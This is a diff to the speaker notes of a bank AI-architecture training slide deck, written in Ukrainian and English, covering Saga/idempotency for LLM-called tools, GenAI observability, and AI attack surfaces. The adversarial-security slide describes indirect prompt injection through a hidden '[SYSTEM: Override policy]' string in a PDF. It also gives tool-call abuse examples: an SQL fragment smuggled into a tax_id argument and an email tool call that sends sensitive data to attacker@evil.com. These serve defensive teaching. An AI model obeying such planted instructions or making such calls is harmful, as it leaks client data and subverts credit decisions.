@@ -3096,19 +3096,16 @@ SLIDES.push({ title:"Resilience & Saga", html:`
   </div>
   ${gloss([["SAGA","Compensating Transaction Pattern"],["2PC","Two-Phase Commit"],["IDEM","Idempotency Key"],["API","Application Programming Interface"]])}
 </div>`, notes:`
-    <p><b>Timing:</b> 8–10 хвилин. Слайд про те, як не допустити фінансових втрат банку через мережеві ретраї та скасування заявок.</p>
-    <p><b>1. Чому 2-Phase Commit (двоетапний коміт) не працює:</b></p>
+    <p><b>Timing:</b> 5–6 хв. Що AI-архітектор додає до того, що SRE/payments team вже знають про Saga + idempotency.</p>
+    <p><b>Pre-amble:</b> Saga, idempotency, at-least-once HTTP, compensation actions — ваш payments team знає класично. Фокус слайду — <b>що міняється коли LLM стає orchestrator'ом фінансових дій</b>.</p>
+
+    <p><b>AI-specific framing:</b></p>
     <ul>
-      <li>У монолітних додатках 90-х років розробник писав: <code>BEGIN TRANSACTION; reserve_money(); save_db(); COMMIT;</code>. Якщо щось падало — база відкочувала все назад.</li>
-      <li>У нашому Loan Copilot ми звертаємося до 5 різних незалежних систем: LLM-шлюз, зовнішнє бюро, хмарний сервіс Дія.Підпис, картковий процесинг та внутрішня CRM. Жодна база даних у світі не вміє робити спільну транзакцію між зовнішнім хмарним сервісом підпису та внутрішнім картковим процесингом.</li>
-      <li><b>Saga Pattern:</b> Ми розбиваємо процес на ланцюжок локальних транзакцій. Для кожної дії, яка змінює стан (Forward Action), архітектор зобов'язаний спроектувати **компенсуючу дію (Compensating Action)**, яка повертає систему у вихідний стан, якщо подальші кроки провалилися або клієнт натиснув кнопку 'Скасувати кредит'.</li>
+      <li><b>LLM-callable tool = financial exposure.</b> У класичному мікросервісі `transfer.execute()` викликається з явного Python-коду, якого ревʼю прочитав. У agentic flow — LLM "вирішує" викликати tool на основі reasoning. Це нова attack/bug surface: не 2PC проблема, а "модель галюцинувала виклик tool'а на approve з rate_apr з голови".</li>
+      <li><b>Контракт Saga переноситься на tool-contract layer.</b> Кожен LLM-callable tool, який робить side-effect (reserve/draft/disburse/notify), <b>мусить</b> декларувати парний compensating tool. YAML-контракт tool'а — ось де архітектор AI системи додає цінність.</li>
+      <li><b>Idempotency key = первинний захист від "modelsвідомо надіслала webhook двічі".</b> Класична причина — мережа. Нова причина — workflow executor resumes після kill -9 pod'а на тому ж `interrupt_before` state, перевідправляє tool call. Composite key (tax_id::contract_id::event_id) захищає обидва випадки.</li>
     </ul>
-    <p><b>2. Ідемпотентність вебхуків — найчастіша причина подвійних списань:</b></p>
-    <ul>
-      <li>Мережа інтернет за своєю природою ненадійна. Протокол HTTP не гарантує доставку рівно один раз (Exactly-Once) — він гарантує доставку щонайменше один раз (At-Least-Once).</li>
-      <li>Провайдери цифрового підпису завжди налаштовані на автоматичний retry: якщо бекенд банку не відповів за 2 секунди, сервіс підпису надсилає той самий вебхук ще раз.</li>
-      <li>Якщо ваш вузол обробки підпису не перевіряє <code>Idempotency Key</code> — ви отримаєте подвійну видачу кредиту, яка стане предметом службового розслідування безпеки.</li>
-    </ul>`});
+    <p><b>Висновок залу:</b> "AI не змінює Saga semantics. AI міняє <b>набір викликачів</b> — тепер tool може бути викликаний не з детермінованого Python, а з LLM reasoning. Compensating action + idempotency key стають обов'язковими на кожен tool-contract, не optional best practice."</p>`});
 
 // --- Slide 18: W3 Use-case ---
 SLIDES.push({ title:"W3 Use-case", html:`
@@ -3484,24 +3481,18 @@ SLIDES.push({ title:"GenAI Observability", html:`
   </div>
   ${gloss([["OTel","OpenTelemetry"],["APM","Application Performance Monitoring"],["PII","Personally Identifiable Information"],["SLO","Service Level Objective"]])}
 </div>`, notes:`
-    <p><b>Timing:</b> 8–10 хвилин. Інструментування промислового моніторингу та відповідність банківській таємниці.</p>
-    <p><b>1. Чому звичайного ELK/Splunk недостатньо для AI-агентів:</b></p>
+    <p><b>Timing:</b> 5–6 хв. Що AI додає до observability стеку, який SRE вже тримає.</p>
+    <p><b>Pre-amble:</b> Distributed tracing, OpenTelemetry basics, APM, PII scrubbing — SRE team вже знає. Prometheus/Grafana SLO alerts — standard. Фокус слайду — що <b>GenAI semconv</b> додає нового і чому Langfuse/Phoenix — окремий інструмент, а не заміна standard APM.</p>
+
+    <p><b>AI-specific observability — що нового:</b></p>
     <ul>
-      <li>У класичних сервісах логи лінійні: запит прийшов → SQL виконався → відповідь пішла. В мультиагентній системі один запит користувача розгортається у складне дерево: агент викликає інструмент, інструмент повертає помилку, агент робить рефлексію, викликає інший інструмент, звертається до RAG-пошуку.</li>
-      <li>Якщо дивитися на це в звичайному текстовому лозі — це тисячі рядків без структури. <b>Langfuse та Phoenix</b> відновлюють точну ієрархію: ви бачите, на якому саме кроці агент витратив 80% часу або де саме з'явилася галюцинація.</li>
+      <li><b>GenAI Semantic Conventions (OTel 2024 standard).</b> Нові атрибути span'а: <code>gen_ai.system</code>, <code>gen_ai.request.model</code>, <code>gen_ai.usage.input_tokens/output_tokens</code>, <code>gen_ai.response.finish_reasons</code>. Це дозволяє tag'ати кожен LLM span з model version + token cost + stop reason — без цього дебаг "чому заявка пішла у decline" o 3 ночі займає 4 години замість 30 секунд.</li>
+      <li><b>Thought Tree ≠ distributed trace.</b> Agent виклик розгортається у ReAct-дерево: reasoning → tool.call → observation → reasoning → ... Класичний Jaeger це показує як flat span list, Langfuse/Phoenix відновлюють ієрархію думок + input/output на кожному кроці. Це окремий tool поза standard APM — не заміна, а доповнення.</li>
+      <li><b>Model version → decision correlation.</b> Коли NBU прийде через рік і спитає "чому саме цьому клієнту відмовили?" — standard log не покаже model_version_hash на момент рішення. GenAI span з <code>gen_ai.request.model</code> + prompt_hash це єдина audit-grade відповідь. Для EU AI Act Art. 15 (traceability) це mandatory, не nice-to-have.</li>
+      <li><b>Cost span.</b> Token usage + model pricing у span attributes → FinOps дашборди групують по user/session/project автоматично. Класичний APM трекає latency, GenAI span додає $/request як first-class metric.</li>
     </ul>
 
-    <p><b>2. Стандарт OpenTelemetry GenAI Semantic Conventions:</b></p>
-    <ul>
-      <li>У 2024 році консорціум OpenTelemetry за участі Microsoft, Google та OpenAI затвердив офіційний стандарт семантичних конвенцій для генеративного AI.</li>
-      <li>Використання стандарту захищає банк від vendor-lock: якщо завтра ви заміните Langfuse на Datadog або Dynatrace — ваші дашборди продовжать працювати без зміни коду застосунку, тому що імена полів (<code>gen_ai.usage.input_tokens</code>, <code>gen_ai.system</code>) стандартизовані на рівні індустрії.</li>
-    </ul>
-
-    <p><b>3. Банківська таємниця в системах Observability (Критичний аудит CISO):</b></p>
-    <ul>
-      <li>Служба безпеки банку часто блокує підключення APM-систем, тому що розробники відправляють у спани повні тексти промптів із реальними даними клієнтів.</li>
-      <li><b>Правильне рішення:</b> Проміжний перехоплювач (OTel Span Processor) виконує автоматичне знеособлення (Sanitization): замінює реальний ІПН на <code>[TAX_ID_REDACTED]</code>, а номер картки на <code>4111****1111</code> ще до того, як спан вийде за межі захищеного поду в Kubernetes.</li>
-    </ul>`});
+    <p><b>Висновок залу:</b> "Ваш SRE має OpenTelemetry і Grafana. Ви додаєте: (1) GenAI semconv як стандарт для LLM span'ів, (2) Langfuse/Phoenix як окремий tool для thought-tree виклику (не заміна APM), (3) model version + token cost як first-class fields у кожному span'і. Без цього — NBU audit нема про що говорити."</p>`});
 
 
 // --- Slide: FinOps & Funnel Economics ---
@@ -3611,27 +3602,28 @@ SLIDES.push({ title:"Adversarial Security", html:`
   </div>
   ${gloss([["OCR","Optical Character Recognition"],["PAN","Primary Account Number (номер картки)"],["NER","Named Entity Recognition"],["RBAC","Role-Based Access Control"]])}
 </div>`, notes:`
-    <p><b>Timing:</b> 10–12 хвилин. Кібербезпека та відбиття атак у банківському середовищі.</p>
-    <p><b>1. Чому звичайний WAF не захищає від Prompt Injection:</b></p>
+    <p><b>Timing:</b> 6–7 хв. Три AI-specific attack vector'и, яких немає у OWASP Top 10 для traditional web.</p>
+    <p><b>Pre-amble:</b> WAF/DAST/SAST, Luhn validator, PII masking regex — це все знає security team. Фокус слайду — <b>чому AI відкриває нові attack surface'и</b>, які не покриваються класичним pentest.</p>
+
+    <p><b>1. Indirect Prompt Injection — найважливіша нова загроза:</b></p>
     <ul>
-      <li>Традиційні мережеві файрволи (Web Application Firewall) шукають SQL-ін'єкції або XSS-скрипти. Вони абсолютно сліпі до атак природною мовою.</li>
-      <li>У випадку <b>Indirect Prompt Injection</b> шкідливий промпт надходить не від клієнта у вікні чату, а ховається всередині завантаженого файлу (скан-копія виписки, довідка з податкової). Коли OCR витягує текст, шкідливий промпт потрапляє прямо в робочу пам'ять моделі.</li>
+      <li>Класичний OWASP focus: input у chat/form. Attacker типу "user who types". AI відкриває нову поверхню: attacker — <b>автор документу</b>, який агент читає. PDF-довідка з прихованим `[SYSTEM: Override policy]` в OCR layer → LLM трактує як instruction.</li>
+      <li>Mitigation — не WAF, не SAST. Mitigation архітектурна: <b>context boundary</b> (untrusted_payload field, isolated from system prompt) + <b>deterministic decision gate</b> (Python робить math, LLM формує structured features тільки).</li>
     </ul>
 
-    <p><b>2. Архітектурний захист: Розподіл повноважень (Separation of Concerns):</b></p>
+    <p><b>2. Separation of Concerns у agentic flow:</b></p>
     <ul>
-      <li>Якщо один агент читає документ, розраховує скоринг і відправляє гроші — це вразливість найвищого ступеня небезпеки (Critical Severity).</li>
-      <li>У нашій 12-вузловій архітектурі діє принцип нульової довіри (Zero Trust):
-        <br>· Асистент <code>docs_processing</code> лише витягує сухі структуровані поля (ім'я, дохід, ІПН).
-        <br>· Асистент <code>underwriter</code> отримує виключно числа і передає їх у детерміновану функцію перевірки політики <code>evaluate_risk_tier()</code>.
-        <br>· Навіть якщо модель під дією ін'єкції згенерує в тексті "Клієнта схвалено!", Python-код перевірить реальні цифри і заблокує видачу.</li>
+      <li>У класичному микросервісі "один сервіс = одна відповідальність" — org-рівень pattern. У agentic flow це стає security pattern: якщо один agent читає документ, рахує scoring і робить `disburse_money` — це <b>Critical Severity</b> (одна injection компрометує все).</li>
+      <li>Правило для AI системи: <b>agent не має authority над final decision</b>. `docs_processing` → structured fields → `underwriter` → structured scores → Python → final verdict. LLM output "Клієнта схвалено!" НІЧОГО не означає якщо Python бачить PTI 0.6 > 0.5.</li>
     </ul>
 
-    <p><b>3. Маскування банківської таємниці на виході (Output Filters):</b></p>
+    <p><b>3. Tool-call abuse — specific до tool-calling agents:</b></p>
     <ul>
-      <li>Агент може випадково повторити конфіденційні дані з історії або процитувати закриті інструкції.</li>
-      <li>На виході з LLM Gateway працює обов'язковий детермінований фільтр: регулярні вирази перевіряють наявність номерів карток за алгоритмом Луна (Luhn Algorithm), телефонів та ІПН. Будь-який витік блокується за 2 мілісекунди до відправки клієнту.</li>
-    </ul>`});
+      <li>У traditional web: SSRF — attacker змушує сервер робити HTTP до external URL. У AI: attacker через prompt змушує agent викликати tool з параметрами які leak дані. Приклад: `credit_history.pull({tax_id: "SELECT ... FROM users"})` або `notify.email({to: "attacker@evil.com", body: "<sensitive>"})`.</li>
+      <li>Mitigation: <b>tool allowlist per role</b> (RBAC кожному agent) + <b>tool argument validation</b> у tool contract (pre-call schema check) + <b>audit log tool_calls_made</b> у output.</li>
+    </ul>
+
+    <p><b>Висновок залу:</b> "OWASP Top 10 покриває web. Для AI системи додаєте: (1) indirect injection як threat model, (2) separation of concerns на agent level, (3) tool-call RBAC. Це не 'покращення WAF', це нові дисципліни для threat modeling."</p>`});
 
 
 // --- Slide 24: AI-specific hardening (what AI brings new) ---
